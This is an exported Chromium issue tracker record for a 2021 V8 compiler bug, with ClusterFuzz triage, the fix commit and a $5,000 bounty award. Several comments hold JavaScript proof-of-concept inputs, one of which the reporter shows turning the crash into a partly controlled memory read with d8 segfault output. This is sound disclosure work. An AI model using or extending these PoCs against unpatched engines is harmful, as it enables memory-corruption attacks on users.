# Security: v8 SIGTRAP in optimized code

| Field | Value |
|-------|-------|
| **Issue ID** | [40055446](https://issues.chromium.org/issues/40055446) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P3 |
| **Component** | Blink>JavaScript>Compiler |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | jm...@gmail.com |
| **Assignee** | ne...@chromium.org |
| **Created** | 2021-04-04 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following PoC crashes both debug and release builds of the latest v8 version 73787 at commit: <https://crrev.com/b2ae9951d4a12b996532022959f44a0cd10184ec>

**VERSION**  

Chrome Version: 89.0.4389.114 64 bits + Stable  

Operating System: Windows 10 x64 + Linux Ubuntu 20 x64

**REPRODUCTION CASE**

START\_OF\_POC

z=(a)=>{let y = Math.min(Infinity ? [] : Infinity, -0) / 0; if (a) y = -0; return y ? 1 : 0}  

z(false); for (let i = 0; i < 0x10000; ++i) z(false)

END\_OF\_POC

CRASH INFORMATION  

Type of crash:

on Linux Ubuntu 20 x64 at d8: Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.

on Windows 10 x64 at Chrome Browser: Snap! Error Code: STATUS\_BREAKPOINT

CREDIT  

Reporter credit: Jose Martinez tr0y4 from VerSprite Inc.

## Timeline

### [Deleted User] (2021-04-04)

[Empty comment from Monorail migration]

### cl...@chromium.org (2021-04-05)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5277701183963136.

### cl...@chromium.org (2021-04-06)

Detailed Report: https://clusterfuzz.com/testcase?key=5277701183963136

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: Trap
Crash Address: 0x000000000000
Crash State:
  v8::internal::Invoke
  v8::internal::Execution::Call
  v8::Script::Run
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=73690:73691

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5277701183963136

The reproduce tool requires a ClusterFuzz source checkout. To prepare one, run:

git clone https://github.com/google/clusterfuzz && cd clusterfuzz && git checkout tags/reproduce-tool-stable

To reproduce this issue, run:

./reproduce.sh -t https://clusterfuzz.com/testcase-detail/5277701183963136 -b /path/to/build

Please use the GN arguments provided in this report when building the binary. If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### cl...@chromium.org (2021-04-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2021-04-06)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Blink>JavaScript]

### cl...@chromium.org (2021-04-06)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/v8/v8/+/bda0849019e7140496cb35068962fd339bd610c9 ([sparkplug] Enable short builtin calls by default (#3)).

If this is incorrect, please let us know why and apply the Test-Predator-Wrong-CLs label. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### is...@chromium.org (2021-04-07)

[Empty comment from Monorail migration]

### is...@chromium.org (2021-04-07)

jmamj90@ thank you for the report!

The issue reproduces on ToT and it was already there last November: d35aaf74e2e2a2a36458fb2437b70765da4f62d1, I didn't try to go deeper.
TF generates breakpoints which we hit during execution.

=============

function z(a) {
  let y = Math.min(Infinity ? [] : Infinity, -0) / 0;
  if (a) y = -0;
  return y ? 1 : 0
}
%PrepareFunctionForOptimization(z);
z(false);
%OptimizeFunctionOnNextCall(z);
z(false);


### jm...@gmail.com (2021-04-07)

Hello
Thanks
could you please add my company email versprite.research@gmail.com
 as a viewer for this bug, please?


### ct...@chromium.org (2021-04-07)

[Empty comment from Monorail migration]

### is...@chromium.org (2021-04-07)

[Empty comment from Monorail migration]

### is...@chromium.org (2021-04-07)

[Empty comment from Monorail migration]

### is...@chromium.org (2021-04-07)

[Empty comment from Monorail migration]

### ne...@chromium.org (2021-04-08)

[Empty comment from Monorail migration]

[Monorail components: Blink>JavaScript>Compiler]

### ne...@chromium.org (2021-04-08)

[Empty comment from Monorail migration]

### ne...@chromium.org (2021-04-08)

Another bug in SimplifiedLowering it seems.

### ne...@chromium.org (2021-04-08)

This one is related to dead code, and is very nasty.

### ne...@chromium.org (2021-04-12)

[Empty comment from Monorail migration]

### ne...@chromium.org (2021-04-12)

[Empty comment from Monorail migration]

[Monorail components: -Blink>JavaScript]

### ne...@google.com (2021-04-14)

Status udpate: I'm looking into possible fixes. I currently believe that this is not a security issue.

### gi...@appspot.gserviceaccount.com (2021-04-23)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/01a93417e4f4bdf83a129dfc0a3e3299ca9b0f53

commit 01a93417e4f4bdf83a129dfc0a3e3299ca9b0f53
Author: Georg Neis <neis@chromium.org>
Date: Fri Apr 23 07:26:19 2021

[compiler] Aggressively lower pure dead operations to DeadValue

Bug: chromium:1195650
Change-Id: Ia18c053d54aa62ecafc387688dfb57ee63d2a09c
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2831490
Reviewed-by: Nico Hartmann <nicohartmann@chromium.org>
Commit-Queue: Georg Neis <neis@chromium.org>
Cr-Commit-Position: refs/heads/master@{#74145}

[modify] https://crrev.com/01a93417e4f4bdf83a129dfc0a3e3299ca9b0f53/src/compiler/simplified-lowering.cc
[add] https://crrev.com/01a93417e4f4bdf83a129dfc0a3e3299ca9b0f53/test/mjsunit/compiler/regress-1195650.js


### ne...@chromium.org (2021-04-23)

[Empty comment from Monorail migration]

### ne...@chromium.org (2021-04-23)

[Empty comment from Monorail migration]

### cl...@chromium.org (2021-04-23)

ClusterFuzz testcase 5277701183963136 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8&range=74144:74145

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### jm...@gmail.com (2021-04-23)

Hi! I was in vacation. For increasing security impact, I've managed to convert this trapbreakpoint bug into a bug that returns different optimized values, please launch d8 with --allow-natives-syntax:

z=(a)=>{let e,q = undefined; if (a){e = 0; [][Math.abs("")]; q = 0x40000000}; return e != q}

console.log(z(false))             //prints false
;%PrepareFunctionForOptimization(z)
z(true); z(true)
;%OptimizeFunctionOnNextCall(z)
console.log(z(false))             //prints true





### ne...@chromium.org (2021-04-26)

Hi, this seems to rely on another bug that was fixed last week: https://chromium-review.googlesource.com/c/v8/v8/+/2839544

### [Deleted User] (2021-04-26)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-26)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-26)

[Empty comment from Monorail migration]

### ne...@google.com (2021-04-28)

[Empty comment from Monorail migration]

### jm...@gmail.com (2021-04-28)

Hi! oh sorry wrong bug,

For increasing security impact, I've managed to convert this Math.min(u ? Infinity : [ ])  trapbreakpoint bug  into a semiarbitrary read segmentation fault bug, where I specify x=0x4442221 and Javascript reads from 2x-1, in this case 0x8884441:

troya@ver-ubr01:/tmp/j/crbug-1195650$ cat 4.js
z = (a)=>{let y = Math.min(undefined ? Infinity : []) % false; if (a) y = 0x7fffffff; y = Math.abs(y + 0x4442221); if (a) y = false; return y && 0}

;%PrepareFunctionForOptimization(z)
z(true)
;%OptimizeFunctionOnNextCall(z)
z(false)

troya@ver-ubr01:/tmp/j/crbug-1195650$ ../d8-linux-release-v8-component-74019/d8 --allow-natives-syntax 4.js
Received signal 11 SEGV_MAPERR 000008884441

==== C stack trace ===============================

 [0x55b17e15a427]
 [0x7f90b105f3c0]
 [0x1752001c411b]
[end of stack trace]
Segmentation fault


### ne...@google.com (2021-04-28)

[Empty comment from Monorail migration]

### ne...@google.com (2021-04-28)

You're right! Thanks for the update.

### [Deleted User] (2021-04-29)

Setting Pri-2 to match security severity Low. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2021-05-20)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-05-20)

Congratulations, Jose! The VRP Panel has awarded you $5000 for this report. Nice work! 

### am...@google.com (2021-05-21)

[Empty comment from Monorail migration]

### jm...@gmail.com (2021-05-25)

Thank you very much!!!

could you please use my company email versprite.research@gmail.com for this reward?
Thank you
Best regards,
Jose

### am...@chromium.org (2021-05-25)

Hi Jose; I will reach out to the finance team to make the change. To ensure we process rewards under your company email address in the future, please either report the bug via that account OR please add reward to: <company email> in your credit info as part of your initial report. Thanks! 

### am...@chromium.org (2021-07-19)

[Empty comment from Monorail migration]

### am...@google.com (2021-07-19)

[Empty comment from Monorail migration]

### [Deleted User] (2021-07-30)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2021-08-03)

[Empty comment from Monorail migration]

### is...@google.com (2021-08-03)

This issue was migrated from crbug.com/chromium/1195650?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/1196176, crbug.com/chromium/1196179, crbug.com/chromium/1196190]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-07)

You have been auto-cc'ed due to this issue's component.
To update this component's auto-cc rules, visit
go/chrome-blintz-user-guide

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055446)*
